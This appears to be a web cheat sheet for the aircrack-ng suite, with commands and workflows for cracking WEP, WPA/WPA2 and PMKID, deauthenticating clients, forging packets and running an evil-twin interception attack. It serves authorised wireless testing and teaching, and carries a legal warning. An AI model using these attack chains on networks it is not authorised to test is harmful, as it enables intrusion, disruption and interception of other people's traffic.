About aircrack-ng
Aircrack-ng is a complete 802.11 WEP and WPA/WPA2-PSK key cracking suite. Tools cover packet capture, replay attacks, authentication cracking, and analysis. Requires monitor-mode capable adapter and root/admin privileges.
⚠ Legal Warning Use only on networks you own or have written authorization to test. Unauthorized access is illegal.

aircrack-ng
WEP KEY CRACKING + WPA/WPA2 PASSPHRASE RECOVERY
WPA Crack — Dictionary Crack WPA/WPA2 handshake with wordlist +
Runs dictionary attack against a captured 4-way handshake. Capture file must contain at least one complete handshake.
# Basic dictionary attack aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap # Specify ESSID instead of BSSID aircrack-ng -w wordlist.txt -e "NetworkName" capture.cap # Multiple wordlists aircrack-ng -w list1.txt,list2.txt,list3.txt capture.cap
FlagDescription
-w <file>Wordlist file path (comma-separated for multiple)
-b <bssid>Target AP MAC address (filter multiple networks)
-e <essid>Target AP SSID name
-l <file>Write cracked key to file
-qQuiet — suppress output
WEP Crack Statistical attack on WEP encrypted captures +
Cracks WEP keys using statistical analysis. Needs ~5,000-40,000 IVs minimum. More IVs = faster crack.
# Auto detect key length aircrack-ng capture.cap # Force 128-bit key aircrack-ng -n 128 capture.cap # Multiple capture files merged aircrack-ng -b AA:BB:CC:DD:EE:FF *.cap
FlagDescription
-n <bits>WEP key length: 64, 128, 152, 256, 512
-i <index>WEP key index (0-3), default 0
-f <fudge>Fudge factor (higher = slower but more exhaustive)
-k <korek>Disable specific KoreK attack (1-17)
-m <maddr>MAC of client for WEP PRGA
PMKID Attack Crack WPA without full handshake +
Uses PMKID hash extracted from a single EAPOL frame. No need for a connected client. Use hcxdumptool to capture PMKID first.
# Convert hcxpcapng to hashcat format first hcxpcapngtool -o hash.hc22000 capture.pcapng # Then crack with hashcat (mode 22000) hashcat -m 22000 hash.hc22000 wordlist.txt # Or with aircrack-ng on PMKID cap aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF pmkid.cap
ℹ Info PMKID is embedded in RSN IE. Available on most modern routers using WPA2.
airodump-ng
PACKET CAPTURE // AP & CLIENT DISCOVERY
Scan All Networks Discover all visible access points and clients +
Scans all channels and shows every AP and associated client visible to the adapter.
# Basic scan airodump-ng wlan0mon # Scan 5GHz band airodump-ng --band a wlan0mon # Scan both 2.4GHz and 5GHz airodump-ng --band abg wlan0mon
Targeted Capture Lock to specific AP and save capture file +
Locks adapter to the target AP's channel and saves all frames to a capture file. Essential before running attacks.
# Capture specific AP to file airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon # Also capture specific client airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --essid "WIFI_NAME" -w capture wlan0mon # Output in multiple formats airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap,csv,kismet wlan0mon
FlagDescription
-c <channel>Lock to specific channel (1-14 for 2.4GHz)
--bssidFilter by AP MAC address
--essidFilter by AP name
-w <prefix>Write capture to file (prefix.cap, prefix.csv etc)
--output-formatpcap, ivs, csv, gps, kismet, netxml, logcsv
-I <seconds>Update interval (default 1 second)
--uptimeDisplay AP uptime in output
--wpsDisplay WPS information
--berlin <sec>Time before AP/client removed from list
ℹ Output Files Generated -w capture creates: capture-01.cap (packets), capture-01.csv (network list), capture-01.kismet.csv, capture-01.kismet.netxml
GPS Integration Tag captures with location data +
Requires gpsd running. Tags each captured packet with GPS coordinates for wardriving.
# Start gpsd first gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock # Capture with GPS tagging airodump-ng --gpsd -w wardrive --output-format pcap,gps,kismet wlan0mon
aireplay-ng
FRAME INJECTION // REPLAY ATTACKS // DEAUTH
⚠ Prerequisites Adapter must support injection. Test with: aireplay-ng --test wlan0mon
Attack 0 — Deauthentication Force clients to reconnect (capture handshake) +
Sends deauth frames to disconnect clients. Used to force a WPA handshake on reconnection. Works on WEP/WPA/WPA2.
# Deauth all clients from AP (10 deauth frames) aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon # Deauth specific client aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon # Continuous deauth (0 = infinite — use carefully) aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
FlagDescription
-0 <count>Number of deauths to send (0 = infinite)
-a <bssid>Target AP MAC
-c <client>Specific client MAC (omit for broadcast)
Attack 1 — Fake Authentication Associate with target AP without credentials +
Associates with AP for WEP attacks. Required before ARP replay. Two modes: Open System (OPN) and Shared Key (SKA).
# Single fake auth aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon # Persistent fake auth (re-associate every 30s) aireplay-ng -1 30 -a AA:BB:CC:DD:EE:FF wlan0mon # Fake auth with custom client MAC aireplay-ng -1 0 -e "SSID" -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
FlagDescription
-1 <delay>Re-assoc delay in seconds
-e <essid>Target AP SSID
-a <bssid>Target AP MAC
-h <mac>Source MAC address to use
-T <tries>Number of attempts before giving up
Attack 3 — ARP Replay Generate IVs by replaying ARP requests +
Waits for ARP packet, then replays it to generate new IVs. Most effective WEP attack — generates thousands of IVs/second.
# Standard ARP replay aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon # With saved ARP packet aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -r arp_packet.cap wlan0mon
Attack 4 — KoreK ChopChop Decrypt WEP packet without key +
Decrypts a WEP packet byte-by-byte. Slow but doesn't require key. Produces .xor PRGA file usable with packetforge-ng.
aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
Attack 5 — Fragmentation Obtain PRGA keystream via fragmentation +
Obtains 1500 bytes of PRGA keystream. Faster than ChopChop. Output .xor file used to forge packets.
aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
Attack 6 — Café-Latte Recover WEP key from isolated client +
Attacks a WEP client without AP present. Flips bits in ARP packet to elicit replies from client. Works on mobile/isolated devices.
aireplay-ng -6 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC -D wlan0mon
Attack 9 — Injection Test Verify adapter supports packet injection +
Tests adapter injection capability and measures quality/speed. Run before any attack to confirm setup.
# Basic test (broadcasts) aireplay-ng -9 wlan0mon # Test against specific AP aireplay-ng -9 -e "NetworkName" -a AA:BB:CC:DD:EE:FF wlan0mon
airmon-ng
MONITOR MODE MANAGEMENT
List Interfaces Show all wireless adapters +
# List all wireless interfaces + chipset info airmon-ng
Enable Monitor Mode Put adapter into monitor mode +
# Enable monitor mode airmon-ng start wlan0 # Enable on specific channel airmon-ng start wlan0 6 # Kill interfering processes first airmon-ng check kill airmon-ng start wlan0
⚠ Interface Rename wlan0 becomes wlan0mon after enabling monitor mode. Use new name in subsequent commands.
Disable Monitor Mode Restore adapter to managed mode +
# Stop monitor mode airmon-ng stop wlan0mon # Restart NetworkManager after service NetworkManager restart
Check Interfering Processes Find processes that disrupt monitor mode +
NetworkManager, wpa_supplicant, dhclient interfere with monitor mode. Check and kill them.
# Check for interfering processes airmon-ng check # Kill all interfering processes airmon-ng check kill

Decrypt WEP Decrypt WEP-encrypted capture with known key +
# Hex WEP key airdecap-ng -w 1234567890ABCDEF1234567890 capture.cap # ASCII WEP key airdecap-ng -w password123 capture.cap
FlagDescription
-w <key>WEP key in hex or ASCII
-b <bssid>AP BSSID to filter
-e <essid>AP ESSID for WPA decryption
-lSkip LLC header removal
Decrypt WPA/WPA2 Decrypt WPA capture with known passphrase +
# Decrypt WPA with passphrase airdecap-ng -e "NetworkSSID" -p "MyPassword" capture.cap # Output goes to capture-dec.cap
ℹ Output Decrypted file saved as [input]-dec.cap in same directory.
Strip Headers (Open Network) Remove 802.11 headers from unencrypted capture +
airdecap-ng -b AA:BB:CC:DD:EE:FF capture.cap

packetforge-ng
FORGE ENCRYPTED INJECTION PACKETS
Forge ARP Packet Create injectable ARP for WEP IV generation +
Creates a forged ARP packet encrypted with PRGA from fragmentation or ChopChop attack. Used with aireplay-ng -2.
# Forge ARP using PRGA keystream file packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 \ -k 255.255.255.255 -l 255.255.255.255 \ -y fragment.xor -w forged_arp.cap # Inject forged packet aireplay-ng -2 -r forged_arp.cap wlan0mon
FlagDescription
-0Forge ARP packet
-1Forge UDP packet
-2Forge ICMP packet
-3Forge custom packet
-a <bssid>AP MAC address
-h <mac>Source MAC
-k <ip>Destination IP
-l <ip>Source IP
-y <xor>PRGA keystream file (.xor)
-w <file>Output packet file
airbase-ng

Basic Fake AP Create honeypot access point +
# Open fake AP airbase-ng -e "FreeWiFi" -c 6 wlan0mon # Fake WPA2 AP (capture handshakes) airbase-ng -e "FreeWiFi" -c 6 -z 4 wlan0mon # Evil twin (clone existing AP) airbase-ng -e "TargetSSID" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon

-c <chan>Channel to broadcast on
-a <bssid>Custom AP MAC to spoof
-z <type>WPA cipher: 1=WEP, 2=TKIP, 3=WRAP, 4=CCMP, 5=WEP104

-AAd-Hoc mode

-PRespond to all probe requests
-vVerbose output
⚠ Setup After After airbase-ng starts, configure at0 interface with IP and run DHCP server (dnsmasq) to route client traffic.
MITM Setup Route fake AP traffic for interception +
# After airbase-ng is running on at0 ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 # Enable IP forwarding echo 1 > /proc/sys/net/ipv4/ip_forward # NAT traffic out eth0 iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE iptables -A FORWARD -i at0 -o eth0 -j ACCEPT # Run dnsmasq for DHCP dnsmasq --interface=at0 --dhcp-range=10.0.0.2,10.0.0.100,12h

Troubleshooting
COMMON ISSUES & FIXES
Monitor mode fails to enable / reverts to managed +
  1. Kill all interfering processes: airmon-ng check kill
  2. Verify NetworkManager stopped: systemctl stop NetworkManager
  3. Enable monitor mode: airmon-ng start wlan0
  4. Confirm mode: iwconfig wlan0mon — should show Mode:Monitor
  5. If still failing, use manual method:
    ip link set wlan0 down
    iw dev wlan0 set type monitor
    ip link set wlan0 up
Injection test fails / 0% injection rate +
  1. Confirm monitor mode is active: iwconfig
  2. Check chipset supports injection (not all do — Atheros, Ralink, Realtek RTL8812 recommended)
  3. Move closer to target AP — weak signal = failed injection
  4. Lock to correct channel: iwconfig wlan0mon channel 6
  5. Try different driver or update firmware
  6. Test again: aireplay-ng -9 wlan0mon
ℹ Recommended Chipsets Alfa AWUS036ACH (RTL8812AU), Alfa AWUS036NH (RT3070), TP-Link TL-WN722N v1 (AR9271).
No handshake captured in airodump-ng +
  1. Confirm clients are connected to the AP (visible in STATION column)
  2. Send deauth to force reconnect: aireplay-ng -0 5 -a [BSSID] wlan0mon
  3. Check top-right of airodump — should say "WPA handshake: [BSSID]"
  4. Wait for natural reconnect — some clients take 30-60s
  5. Ensure locked to correct channel — channel hopping = missed handshake
  6. Verify capture file isn't corrupt: aircrack-ng capture-01.cap
⚠ Note Must be on correct channel (-c flag in airodump-ng) before deauth or handshake will not be captured.
aircrack-ng shows "Passphrase not in dictionary" +
  1. Try larger wordlist — rockyou.txt is 14M entries, try SecLists or hashcat wordlists
  2. Use rule-based mutation with hashcat: hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule
  3. Generate custom wordlist with crunch or cewl (target's website)
  4. Try PRINCE or Markov chain attacks for longer passphrases
  5. Confirm handshake is valid — not a PMKID or partial handshake
# Convert cap to hashcat format hcxpcapngtool -o hash.hc22000 capture-01.cap # Crack with rules hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
WEP cracking stuck — not enough IVs +
  1. Fake-auth first: aireplay-ng -1 0 -a [BSSID] wlan0mon
  2. Start ARP replay: aireplay-ng -3 -b [BSSID] -h [YOUR_MAC] wlan0mon
  3. Watch IVs count in airodump — need 20,000+ for 64-bit, 40,000+ for 128-bit
  4. If no ARP, use fragmentation/chopchop + packetforge to create injectable ARP
  5. Check airodump shows data incrementing — if not, injection isn't working
"Fixed channel" error in aireplay-ng +
  1. Airodump-ng is hopping channels, conflicting with aireplay
  2. Lock airodump to specific channel: add -c [channel] to airodump command
  3. Or set channel manually: iwconfig wlan0mon channel 6
  4. Run airodump first with channel lock, then aireplay in second terminal
Fake auth returns "Got a deauthentication packet!" +
  1. AP uses MAC filtering — whitelist your MAC first
  2. Spoof MAC of already-associated client: -h [CLIENT_MAC]
  3. Capture client's MAC from airodump STATION column
  4. AP may use Shared Key Auth — try with SKA xor file if you have one
  5. Try increasing re-associate interval: aireplay-ng -1 6000 ...
Adapter not found / interface missing after monitor mode +
  1. List all interfaces including down: ip a or ifconfig -a
  2. Check dmesg for driver errors: dmesg | grep -i wlan
  3. Stop monitor, re-enable: airmon-ng stop wlan0mon && airmon-ng start wlan0
  4. Check if USB adapter disconnected/replugged: lsusb
  5. Reinstall driver or use dkms module for Alfa adapters
"Received X packets, got 0 ARP requests" in attack 3 +
  1. No existing ARP traffic to replay — generate some first
  2. Use fragmentation attack to get PRGA: aireplay-ng -5 ...
  3. Forge ARP with packetforge-ng using the .xor file
  4. Inject forged ARP: aireplay-ng -2 -r forged_arp.cap wlan0mon
  5. Or use interactive replay (attack -2) to replay any captured packet
Workflows
END-TO-END ATTACK CHAINS
WPA2 Handshake Capture & Crack Full workflow from setup to key recovery +
## STEP 1: Kill interfering processes airmon-ng check kill ## STEP 2: Enable monitor mode airmon-ng start wlan0 ## STEP 3: Scan for targets airodump-ng wlan0mon # Note BSSID and CH of target ## STEP 4: Capture on target channel airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon ## STEP 5: Force handshake (new terminal) aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon # Watch airodump for "WPA handshake: AA:BB:CC:DD:EE:FF" ## STEP 6: Crack with wordlist aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
WEP Crack — ARP Replay Full WEP key recovery via ARP injection +
## STEP 1: Setup monitor mode airmon-ng check kill airmon-ng start wlan0 ## STEP 2: Find WEP network airodump-ng wlan0mon # Look for ENC: WEP in list ## STEP 3: Capture IVs on target airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wep_capture --output-format ivs wlan0mon ## STEP 4: Fake authenticate (new terminal) aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon ## STEP 5: ARP replay injection aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon # Wait for IVs to build up (watch #Data in airodump) ## STEP 6: Crack when enough IVs captured aircrack-ng wep_capture-01.ivs
Evil Twin MITM Attack Fake AP with traffic interception +
## STEP 1: Setup monitor mode airmon-ng check kill airmon-ng start wlan0 ## STEP 2: Note target AP details airodump-ng wlan0mon # Record SSID, BSSID, channel ## STEP 3: Deauth clients from real AP aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon & ## STEP 4: Start evil twin on same channel airbase-ng -e "TargetSSID" -a REAL_AP_BSSID -c 6 wlan0mon & ## STEP 5: Configure fake AP interface ifconfig at0 up 192.168.0.1 netmask 255.255.255.0 ## STEP 6: Setup NAT + DHCP echo 1 > /proc/sys/net/ipv4/ip_forward iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE dnsmasq --interface=at0 --dhcp-range=192.168.0.10,192.168.0.100,12h ## STEP 7: Intercept with sslstrip/mitmproxy mitmproxy --mode transparent -p 8080
